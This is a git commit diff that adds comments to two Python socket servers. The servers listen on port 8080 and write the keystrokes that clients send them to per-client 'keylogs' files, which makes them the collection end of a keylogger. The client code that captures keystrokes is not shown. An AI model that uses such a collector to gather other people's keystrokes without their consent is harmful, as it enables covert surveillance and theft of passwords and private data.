d26a201a8cead385c31a231efa05c5a581579bd9
RobertJohnSoler <rsoler@hawk.iit.edu>
2024-12-25 23:24:29 -0600

    added comments for the socket servers

--- socket_server.py
+++ socket_server.py
@@ -3,7 +3,7 @@ import threading
 from threading import Event
 import time
 
-
+# A function to print a given message in a fancy way
 def print_waitmsg(wait_msg, stop_event: Event):
     wait_msgs = [
         f"{wait_msg}   ",
@@ -17,10 +17,15 @@ def print_waitmsg(wait_msg, stop_event: Event):
             time.sleep(0.3)
 
 
+# function to handle a client connection if any
 def handle_client(conn: socket, addr, stop_event: Event):
+
+    # announce the received connection and create a log file for it
     print("Got connection from ", addr)
     file = open(f"keylogs_{addr}.txt", "w")
     conn.settimeout(1)
+
+    # as long as the stop event is not set, just keep receiving keylogs from the client
     while not stop_event.is_set():
         try:
             key = conn.recv(1024).decode()
@@ -29,10 +34,11 @@ def handle_client(conn: socket, addr, stop_event: Event):
                 print("Client must have disconnected.")
                 file.close()
                 break
-            # print(key, end="", flush=True)
             file.write(key)
             file.flush()
-        except socket.timeout:
+        except socket.timeout:  
+            # use periodic time outs to check if the user has pressed ctrl+c, 
+            # because recv() is a blocking call and it keeps ctrl+c in the queue until it a connection finally comes in
             continue
         except :
             print("")
@@ -43,7 +49,11 @@ def handle_client(conn: socket, addr, stop_event: Event):
 
 
 if __name__ == "__main__":
-    stop_event = threading.Event()
+    
+     # event that can be used to tell all threads to stop running
+    stop_event = threading.Event() 
+
+    # socket creation and initialization
     s = socket.socket()
     print("")
     print("Socket created.")
@@ -51,18 +61,29 @@ if __name__ == "__main__":
     s.bind(('0.0.0.0', 8080))
     print("Socket binded to 8080")
     print("")
+
+    # listen for any incoming connections from clients
     s.listen(5)
+
     try:
+
+        # start a thread to do the fancy printing of the message "Socket is listening...,"
         waitmsg_thread = threading.Thread(target=print_waitmsg, args=("Socket is listening", stop_event))
         waitmsg_thread.start()
+
+        # as long as the socket is running and the stop event is not set, keep accepting client connections
         while s and not stop_event.is_set():
             try:
                 connection, address = s.accept()
+                # for every client that connects, start a thread to handle it
                 client_thread = threading.Thread(target=handle_client, args=(connection, address, stop_event))
                 client_thread.start()
-            except socket.timeout:
+            except socket.timeout:  
+                # use periodic time outs to check if the user has pressed ctrl+c, 
+                # because accept() is a blocking call and it keeps ctrl+c in the queue until it a connection finally comes in
                 continue
     except KeyboardInterrupt:
+        # clean everything up once the user presses ctrl+c
         stop_event.set()
         print("")
         print("Closing socket...")
--- socket_server_test.py
+++ socket_server_test.py
@@ -1,24 +1,30 @@
 import socket
 
 while True:
+    
+    # create a socket instance
     s = socket.socket()
     print("")
     print("Socket created.")
 
     port = 8080
 
+    # bind socket to the chosen port
     s.bind(('0.0.0.0', port))
     print("Socket binded to ", port)
 
+    # listen for any incoming connection 
     s.listen(5)
     print("Socket is listening...")
 
-
+    # accept a connection if one arrives
     c, addr = s.accept()
     print("Got connection from ", addr)
 
+    # open a text file to log all the keystrokes being received from the client
     f = open(f"keylogs_{addr}.txt", "w")
     
+    # infinite loop to keep receiving keystrokes from the connected client
     while True:
         try:
             key = c.recv(1024).decode()
